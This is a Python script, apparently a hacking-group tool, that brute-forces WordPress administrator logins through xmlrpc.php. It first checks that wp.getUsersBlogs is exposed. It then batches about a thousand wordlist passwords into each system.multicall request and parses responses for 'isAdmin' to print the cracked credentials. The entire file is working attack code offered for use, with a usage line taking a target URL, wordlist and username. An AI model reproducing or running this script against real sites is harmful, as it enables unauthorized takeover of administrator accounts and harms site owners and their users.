from html import escape as esc
import requests
import os
import math
import xml.etree.ElementTree as ET
import sys
from termcolor import colored, cprint
from time import sleep

class bcolors:
  HEADER    = '\033[95m'
  OKBLUE    = '\033[94m'
  OKGREEN   = '\033[92m'
  WARNING   = '\033[93m'
  FAIL      = '\033[91m'
  ENDC      = '\033[0m'
  BOLD      = '\033[1m'
  UNDERLINE = '\033[4m'
  CBLINK    = '\033[5m'
  CYELLOW = '\033[33m'
#######################################################################################################
#                                         FUNCTIONS                                                   #
#######################################################################################################

def banner():
  pass

def verify(url): ## verify if target is vulnerable or not

    xmlrpc_methods = "<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
     ## input sys.argv for url in main()

    headers = {"Content-Type": "application/xml"}
    r = requests.post(url, data=xmlrpc_methods, headers=headers)
    r.encoding = 'UTF-8'
    if "wp.getUsersBlogs" in r.text:
        print(colored('[>]', 'green'), colored('Target is vulnerable.', 'white'))
    else:
        print(bcolors.CYELLOW + "Target is NOT vulnerable for Brute Forcing." + bcolors.ENDC)
        print("wp.GetUsersBlogs is not enabled.")
        print("Please report any incorrect results on GitHuB or DM on Twitter.")
        sys.exit(0)

def admin(data):
  root = ET.fromstring(data)
  struct_nodes = root.findall(".//struct")
  count = 0

  for struct_node in struct_nodes:
    for members_node in struct_node:
      for member_node in members_node:
        if member_node.text and "isAdmin" in member_node.text:
          return True, count
    count += 1

  return False, count

def bruteforcing(url, user, passwords):
  prefix = "<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"
  payload = ""
  suffix = "</data></array></value></param></params></methodCall>"

  for password in passwords:
    payload += "<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name>"
    payload += "<value><array><data><value><array><data><value><string>" + user + "</string></value><value><string>" + esc(password) + "</string></value>"
    payload += "</data></array></value></data></array></value></member></struct></value>"

  data = prefix + payload + suffix 
  headers = {"Content-Type": "application/xml"}
  r = requests.post(url, data=data, headers=headers)
  r.encoding = 'UTF-8'
  #print(r.text)
  return r.text
 
def guest():
   os.system("clear")
   os.system("figlet GoHasHinDi")
   print(colored(f"+-----------------------------------+",'red'))
   print(colored(f" TN.ERERERE",'white'))
   print(colored(f" Tools Xmlrpc Bruteforce",'white'))
   print(colored(f" Gohashindi Broken Hacking and Ghost 666 Security" ,'white'))
   print(colored(f" https://github.com/herocan-7",'white'))
   print(colored(f"+-----------------------------------+",'red'))

def main(argv):
  if len(argv) < 3:
   os.system("clear")
   os.system("figlet GoHasHinDi")
   print(colored(f"+-----------------------------------+",'red'))
   print(colored(f" TN.ERERERE",'white'))
   print(colored(f" Tools Xmlrpc Bruteforce",'white'))
   print(colored(f" Gohashindi Broken Hacking and Ghost 666 Security" ,'white'))
   print(colored(f" https://github.com/herocan-7",'white'))
   print(colored(f"+-----------------------------------+",'red'))
   print(colored(f" USAGE: python xmlrpc.py http[s]://target.com/xmlrpc.php passwords.txt username",'white'))
   print(colored(f" Note: Untuk Web Yang Berawalan www Tidak Bisa ya Sayang",'red'))
   sys.exit(0)
  
  url = argv[1] 
  wordlist = argv[2] 
  user = argv[3]
  guest()
  print("")
  print(15 * '-' + "Target List :" + 20 * '-')
  print("") 
  verify(url)
  
  print("")
  
  print(bcolors.WARNING + "--=[Target: " + bcolors.ENDC + url + bcolors.WARNING + "]=--" + bcolors.ENDC)
  print("")

  passwords = []
  iterations = 1 
  count = 0

  
  print(colored(f"        \t[...Bruteforcing...]", 'white'))

  with open(wordlist, encoding="ISO-8859-1") as f:
    for line in f:
      passwords.append(line.rstrip()) 
      if count == 999:

        response = bruteforcing(url, user, passwords)
        found, index = admin(response)
        if found:
          cprint(f"{15 * '-'} BRUTEFORCE Berhasil  {15 * '-'}", attrs=['bold'])
          cprint("--=[User found]=--", 'green', attrs=['blink'])
          print("Login: " + user)
          print("Password: " + passwords[index])
          print(bcolors.OKGREEN + "--=[Exiting...]=--" + bcolors.ENDC)
          print("")
          sys.exit(0)
        else:
          # cprint(f"--=[Tried: {str(iterations * 1000)} passwords]=--", 'blue', attrs=['reverse'])
          print(bcolors.FAIL + "--=[Tried: " + str(iterations * 1000) + " passwords]=--" + bcolors.ENDC)
        del passwords[:]
        iterations += 1
        count = 0
      count += 1

  if passwords:
    response = bruteforcing(url, user, passwords)
    found, index = admin(response)
    if found:
      print("BRUTEFORCE  Berhasil")
      print(bcolors.OKGREEN + "--=[User found! Success! " + user + "/" + passwords[index] + "]=--" + bcolors.ENDC)
      print(bcolors.OKGREEN + "--=[Berhasil]=--" + bcolors.ENDC)
      sys.exit(0)

  print(bcolors.FAIL + "--=[Gagal Karena password atau admin tidak ada yang Cocok]=--" + bcolors.ENDC)

main(sys.argv)